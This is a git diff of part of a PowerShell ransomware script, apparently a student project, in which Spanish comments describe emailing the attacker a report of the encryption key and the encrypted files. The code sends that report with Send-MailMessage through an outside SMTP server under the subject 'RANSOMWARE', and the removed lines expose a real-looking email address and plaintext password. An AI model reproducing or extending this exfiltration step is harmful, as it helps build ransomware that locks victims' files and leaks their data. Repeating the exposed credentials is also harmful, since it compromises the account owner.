@@ -226,6 +226,11 @@ $IE.visible=$true
 
 ## MANDAR MENSAJE
 
+## LA IDEA DEL CORREO ES GENERAR UN INFORME CON LA CLAVE USADA Y LOS ARCHIVOS
+## QUE SE HAN CIFRADO.
+## PODEMOS MANDARNOS UN MENSAJE A NOSOTROS MISMOS Y ASI NO USAR EL CORREO DE LA VICTIMA
+## SE HARIA PONIENDO EL CORREO EN $Username Y LA CONTRASEÑA EN $Password
+
 ## --------------------------------------------------------------------------##
  
 
@@ -241,10 +246,10 @@ $Body = $InfoKey + $InfoDone +  ($Files | Format-List | Out-String )
 $Body
 
 
-$Username = "asir2_proyecto@outlook.es"
-$Password = ConvertTo-SecureString -String "retamar1a" -AsPlainText -Force
+$Username = "EMAIL QUE SE USA PARA ENVIAREL INFORME"
+$Password = ConvertTo-SecureString -String "CONTRASEÑA DEL EMAIL" -AsPlainText -Force
 $Credentials = New-Object System.Management.Automation.PSCredential($Username,$Password)
-Send-MailMessage -To “asir2_proyecto@outlook.es"  -From "asir2_proyecto@outlook.es" -SmtpServer 'smtp.live.com' -UseSsl -Subject “RANSOMWARE” -Body “$Body” -Credential $Credentials
+Send-MailMessage -To “EMAIL"  -From "EMAIL" -SmtpServer 'smtp.live.com' -UseSsl -Subject “RANSOMWARE” -Body “$Body” -Credential $Credentials
 
 
 
